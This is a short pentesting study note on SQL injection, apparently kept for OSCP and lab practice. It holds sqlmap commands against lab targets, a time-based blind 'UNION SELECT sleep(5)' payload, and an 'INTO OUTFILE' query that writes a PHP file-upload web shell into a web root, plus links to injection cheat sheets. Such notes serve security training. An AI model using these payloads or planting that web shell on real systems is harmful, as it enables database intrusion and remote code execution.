---
publish: true
created: 2026-02-06T18:24:21.747+05:30
modified: 2026-06-22T09:02:22.292+05:30
---

### sqlmap

This is not allowed in OSCP.

```
# test sql injection in cookie.
sqlmap -u http://localhost/labs/i0x02.php --level=2 --cookie="session=6967cabefd763ac1a1a88e11159957db"

 sqlmap -u ws://soc-player.soccer.htb:9091/ -D '{"ID":"56795"}' --batch --level 5 --risk 3 --dbms mysql --threads 10

--dbs # displays db
--tables # list tables
```

### Manual

##### Blind

test sleep.

```
?priority=Normal'+UNION+SELECT+sleep(5)+--+'
```

SQL command to save a php file which will upload files.

```
SELECT   
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

#### Cheat Sheets

<https://sqlwiki.netspi.com/#mysql> - main

SQL <https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/>

[MS SQL cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

<https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/>

<https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/Privilege%20Escalation/README.md>
